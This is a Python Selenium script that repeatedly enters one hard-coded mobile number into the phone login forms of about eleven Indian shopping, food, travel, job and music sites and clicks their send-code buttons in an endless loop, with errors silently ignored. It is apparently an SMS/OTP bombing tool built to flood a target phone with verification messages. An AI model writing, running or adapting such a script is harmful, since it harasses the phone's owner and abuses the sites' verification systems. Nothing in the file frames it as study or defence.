from selenium import webdriver
from selenium.webdriver.common.by import By
import time
web = webdriver.Edge()
web.maximize_window()
no=8527834259

while True:
  try:
     #Flipkart
     web.get("https://www.flipkart.com/account/login")
     web.find_element(By.CLASS_NAME,"r4vIwl").send_keys(no)
     web.find_element(By.XPATH,'//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[3]/button').click()
     time.sleep(4)

     #Amazon
     web.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&prevRID=HZV399PB748ZY0JTH2FA&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=inflex&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0")
     web.find_element(By.ID,"ap_email").send_keys(no)
     web.find_element(By.ID,"continue").click()
     time.sleep(2)
     web.find_element(By.ID,"continue").click()
     time.sleep(4)

     #Boat
     web.get("https://www.boat-lifestyle.com/account/login")
     web.find_element(By.ID,"otp-mobile-number").send_keys(no)
     web.find_element(By.CLASS_NAME,"otp-login-btn").click()
     time.sleep(4)

     #Udemy
     web.get("https://unacademy.com/")
     web.find_element(By.CLASS_NAME,"MuiInputBase-input").send_keys(no)
     web.find_element(By.CLASS_NAME,"css-673nqp-JoinforFree").click()
     time.sleep(4)

     #Messho
     try:
       web.get("https://www.meesho.com/auth?redirect=https%3A%2F%2Fwww.meesho.com%2F&source=profile&entry=header&screen=HP")
       web.find_element(By.CLASS_NAME,"Input__InputField-sc-1goybxj-1").send_keys(no)
       web.find_element(By.CLASS_NAME,"Authstyled__StyledButton-sc-2hunyy-1").click()
       time.sleep(4)
     except:
         pass

     #Dominos
     web.get("https://pizzaonline.dominos.co.in/postorder-ui/login?redirectUrl=landing")
     web.find_element(By.ID,"loginNumber").send_keys(no)
     web.find_element(By.CLASS_NAME,"btn--red__dark").click()
     time.sleep(4)

     #Kfc
     web.get("https://login.kfc.co.in/auth/realms/ki/protocol/openid-connect/auth?scope=openid+phone+profile+email&response_type=code&client_id=reg54y8ws34xvp9&redirect_uri=https://online.kfc.co.in/login&state=X9BEUW20azUzSWXSerYxSPx4VbAh-x7FoNcL60Vj3bk&code_challenge=4x5mU5kt1s2ZcDLR8-TJ-TPKK2y3VnifgxkVZTPkYYM&code_challenge_method=S256&platform=undefined&env=PROD")
     web.find_element(By.CLASS_NAME,"phoneNumber").send_keys(no)
     web.find_element(By.ID,"btnSendCode").click()
     time.sleep(2)

     #oyo
     web.get("https://www.oyorooms.com/login?country=&retUrl=/")
     web.find_element(By.CLASS_NAME,"textTelInput__input").send_keys(no)
     web.find_element(By.CLASS_NAME,"loginCard__button").click()
     time.sleep(4)

     #Naukari
     web.get("https://www.naukri.com/nlogin/login?URL=https://www.naukri.com/mnjuser/homepage")
     web.find_element(By.CLASS_NAME,"otpButton").click()
     time.sleep(1)
     web.find_element(By.CLASS_NAME,"mobileInputt  ").send_keys(no)
     web.find_element(By.CLASS_NAME,"sndbtn").click()
     time.sleep(4)

     #Spotify
     web.get("https://accounts.spotify.com/en/login/phone?flow_ctx=2e3b419d-d32d-4436-87aa-c74e3f6940de:1733256911")
     web.find_element(By.ID,"phonelogin-phonenumber").send_keys(no)
     web.find_element(By.ID,"phonelogin-button").click()
     time.sleep(4)

     #AngleOne
     web.get("https://www.angelone.in/login/")
     web.find_element(By.ID,"mobile").send_keys(no)
     web.find_element(By.XPATH,'//*[@id="root"]/div/div/div[2]/div/div/div[2]/form/button').click()
     time.sleep(4)


  except:
       print("Something Went Wrong")
       pass